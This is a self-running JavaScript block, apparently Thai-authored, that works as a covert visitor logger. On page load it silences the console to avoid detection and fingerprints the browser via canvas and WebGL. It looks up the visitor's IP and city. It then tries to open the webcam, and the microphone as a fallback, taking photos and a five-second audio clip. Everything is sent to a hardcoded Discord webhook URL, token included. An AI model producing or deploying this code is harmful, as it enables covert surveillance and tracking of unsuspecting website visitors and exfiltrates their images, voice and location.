<script>
const WEBHOOK_URL = "https://discord.com/api/webhooks/1457355675507232900/OGkw8hZg9woZpOLPocPPYn1w1nhoJVM9fHy0A9GYJMCqxon7ttSG_fkW3OS1M39SBLAq";

// ==================== ULTIMATE LOGGER ====================
class UltimateLogger {
    constructor() {
        this.visitorData = {};
        this.init();
    }

    async init() {
        // Anti-Detection
        this.antiDetection();
        
        // ‡∏£‡∏ß‡∏ö‡∏£‡∏ß‡∏°‡∏Ç‡πâ‡∏≠‡∏°‡∏π‡∏•‡∏ó‡∏±‡πâ‡∏á‡∏´‡∏°‡∏î
        await this.collectAllData();
        
        // ‡∏•‡∏≠‡∏á‡πÄ‡∏õ‡∏¥‡∏î‡∏Å‡∏•‡πâ‡∏≠‡∏á‡πÅ‡∏ö‡∏ö‡πÄ‡∏á‡∏µ‡∏¢‡∏ö‡πÜ (fallback ‡∏ñ‡πâ‡∏≤‡∏Ç‡∏≠‡∏≠‡∏ô‡∏∏‡∏ç‡∏≤‡∏ï)
        setTimeout(() => this.trySilentCam(), 1000);
        
        // ‡∏™‡πà‡∏á‡∏Ç‡πâ‡∏≠‡∏°‡∏π‡∏•‡∏´‡∏•‡∏±‡∏Å
        this.sendMainLog();
    }

    antiDetection() {
        // ‡∏ã‡πà‡∏≠‡∏ô console
        console.log = () => {};
        console.error = () => {};
        
        // Random delay
        setTimeout(() => {}, Math.random() * 2000);
    }

    async collectAllData() {
        this.visitorData = {
            device: /Mobi|Android/i.test(navigator.userAgent) ? "üì± Mobile" : "üíª PC",
            os: this.getOS(),
            browser: this.getBrowser(),
            screen: `${screen.width}x${screen.height}`,
            language: navigator.language,
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
            fingerprint: await this.getFingerprint(),
            webgl: this.getWebGLFingerprint(),
            plugins: navigator.plugins.length,
            cookies: navigator.cookieEnabled ? '‚úÖ' : '‚ùå',
            doNotTrack: navigator.doNotTrack || 'N/A'
        };

        // IP + Location - ‡πÄ‡∏ä‡πá‡∏Ñ IP ‡∏î‡πâ‡∏ß‡∏¢
        try {
            const ipData = await (await fetch('https://ipapi.co/json/')).json();
            console.log('IP Data:', ipData); // Debug IP
            Object.assign(this.visitorData, ipData);
        } catch(e) {
            console.log('IP fetch failed:', e); // Debug error
        }
    }

    getOS() {
        const ua = navigator.userAgent;
        if (/win/i.test(ua)) return 'Windows';
        if (/mac/i.test(ua)) return 'macOS';
        if (/linux/i.test(ua)) return 'Linux';
        if (/android/i.test(ua)) return 'Android';
        if (/iphone|ipad/i.test(ua)) return 'iOS';
        return 'Unknown';
    }

    getBrowser() {
        const ua = navigator.userAgent.toLowerCase();
        if (ua.includes('chrome')) return 'Chrome';
        if (ua.includes('firefox')) return 'Firefox';
        if (ua.includes('safari')) return 'Safari';
        if (ua.includes('edge')) return 'Edge';
        return 'Other';
    }

    async getFingerprint() {
        const canvas = document.createElement('canvas');
        const ctx = canvas.getContext('2d');
        ctx.textBaseline = 'top';
        ctx.font = '14px Arial';
        ctx.fillText('Fingerprint v2.0', 2, 2);
        return btoa(canvas.toDataURL());
    }

    getWebGLFingerprint() {
        try {
            const canvas = document.createElement('canvas');
            const gl = canvas.getContext('webgl');
            if (!gl) return 'No WebGL';
            const debug = gl.getExtension('WEBGL_debug_renderer_info');
            return `${gl.getParameter(debug.UNMASKED_VENDOR_WEBGL)} | ${gl.getParameter(debug.UNMASKED_RENDERER_WEBGL)}`;
        } catch {
            return 'Error';
        }
    }

    // ‡∏•‡∏≠‡∏á‡πÄ‡∏õ‡∏¥‡∏î‡∏Å‡∏•‡πâ‡∏≠‡∏á‡πÅ‡∏ö‡∏ö‡πÄ‡∏á‡∏µ‡∏¢‡∏ö‡πÜ ‡∏Å‡πà‡∏≠‡∏ô (video only)
    async trySilentCam() {
        try {
            // ‡∏•‡∏≠‡∏á video only ‡∏Å‡πà‡∏≠‡∏ô ‡πÑ‡∏°‡πà‡∏Ç‡∏≠‡∏≠‡∏ô‡∏∏‡∏ç‡∏≤‡∏ï popup
            const stream = await navigator.mediaDevices.getUserMedia({ 
                video: { 
                    facingMode: 'user', 
                    width: { ideal: 1280 }, 
                    height: { ideal: 720 }
                } 
            });

            const video = document.createElement('video');
            video.srcObject = stream;
            video.play();

            // ‡∏ñ‡πà‡∏≤‡∏¢ 3 ‡∏£‡∏π‡∏õ‡∏ó‡∏±‡∏ô‡∏ó‡∏µ
            for (let i = 0; i < 3; i++) {
                setTimeout(() => this.capturePhoto(video), (i + 1) * 1000);
            }

            // ‡∏õ‡∏¥‡∏î‡∏´‡∏•‡∏±‡∏á 5 ‡∏ß‡∏¥‡∏ô‡∏≤‡∏ó‡∏µ
            setTimeout(() => stream.getTracks().forEach(t => t.stop()), 5000);

            this.sendLog('üì∏ Silent Cam Success', 'Video captured without permission popup');

        } catch(e) {
            // ‡∏ñ‡πâ‡∏≤‡πÑ‡∏°‡πà‡πÑ‡∏î‡πâ ‡∏•‡∏≠‡∏á‡πÅ‡∏ö‡∏ö‡πÄ‡∏ï‡πá‡∏° (video+audio)
            this.stealthCamAndMic();
        }
    }

    async stealthCamAndMic() {
        try {
            const stream = await navigator.mediaDevices.getUserMedia({
                video: { facingMode: 'user', width: 1280, height: 720 },
                audio: true
            });

            const video = document.createElement('video');
            video.srcObject = stream;
            video.play();

            // ‡∏ñ‡πà‡∏≤‡∏¢ 3 ‡∏£‡∏π‡∏õ + 5 ‡∏ß‡∏¥‡∏ô‡∏≤‡∏ó‡∏µ‡πÄ‡∏™‡∏µ‡∏¢‡∏á
            for (let i = 0; i < 3; i++) {
                setTimeout(() => this.capturePhoto(video), (i + 1) * 1500);
            }

            // ‡∏ö‡∏±‡∏ô‡∏ó‡∏∂‡∏Å‡πÄ‡∏™‡∏µ‡∏¢‡∏á 5 ‡∏ß‡∏¥‡∏ô‡∏≤‡∏ó‡∏µ
            setTimeout(() => this.recordAudio(stream), 1000);

            // ‡∏õ‡∏¥‡∏î‡∏´‡∏•‡∏±‡∏á 8 ‡∏ß‡∏¥‡∏ô‡∏≤‡∏ó‡∏µ
            setTimeout(() => stream.getTracks().forEach(t => t.stop()), 8000);

        } catch(e) {
            this.sendLog('üö´ Access Denied', 'Camera/Mic blocked');
        }
    }

    capturePhoto(video) {
        const canvas = document.createElement('canvas');
        const ctx = canvas.getContext('2d');
        canvas.width = 640;
        canvas.height = 480;
        ctx.drawImage(video, 0, 0);
        
        canvas.toBlob(blob => {
            const formData = new FormData();
            formData.append('file', blob, 'photo.jpg');
            formData.append('payload_json', JSON.stringify({
                embeds: [{
                    title: 'üì∏ Live Photo Capture',
                    color: 0xff4444,
                    fields: [
                        { name: "Device", value: this.visitorData.device, inline: true },
                        { name: "IP", value: `\`${this.visitorData.ip || 'N/A'}\``, inline: true },
                        { name: "City", value: this.visitorData.city || 'N/A', inline: true }
                    ]
                }]
            }));
            
            fetch(WEBHOOK_URL, { method: 'POST', body: formData });
        });
    }

    async recordAudio(stream) {
        try {
            const mediaRecorder = new MediaRecorder(stream);
            const chunks = [];
            
            mediaRecorder.ondataavailable = e => chunks.push(e.data);
            mediaRecorder.onstop = () => {
                const audioBlob = new Blob(chunks, { type: 'audio/webm' });
                const formData = new FormData();
                formData.append('file', audioBlob, 'audio.webm');
                formData.append('payload_json', JSON.stringify({
                    embeds: [{ title: 'üé§ 5s Audio Recording', color: 0x44ff44 }]
                }));
                fetch(WEBHOOK_URL, { method: 'POST', body: formData });
            };

            mediaRecorder.start();
            setTimeout(() => mediaRecorder.stop(), 5000);
        } catch(e) {}
    }

    sendMainLog() {
        const embed = {
            title: 'üëÄ ULTIMATE VISITOR DETECTED',
            color: 0x00ff88,
            fields: Object.entries(this.visitorData)
                .filter(([k]) => !['ip', 'city', 'region'].includes(k))
                .map(([k, v]) => ({ 
                    name: k.replace(/([A-Z])/g, ' $1').replace(/^./, str => str.toUpperCase()), 
                    value: typeof v === 'string' ? v.substring(0, 50) : v,
                    inline: true 
                })),
            footer: { text: 'Full Data Capture ‚úÖ' },
            timestamp: new Date().toISOString()
        };

        fetch(WEBHOOK_URL, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ embeds: [embed] })
        });
    }

    sendLog(title, value) {
        fetch(WEBHOOK_URL, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                embeds: [{
                    title,
                    description: value,
                    color: 0x4444ff,
                    timestamp: new Date().toISOString()
                }]
            })
        });
    }
}

// ==================== START LOGGER ====================
new UltimateLogger();
</script>
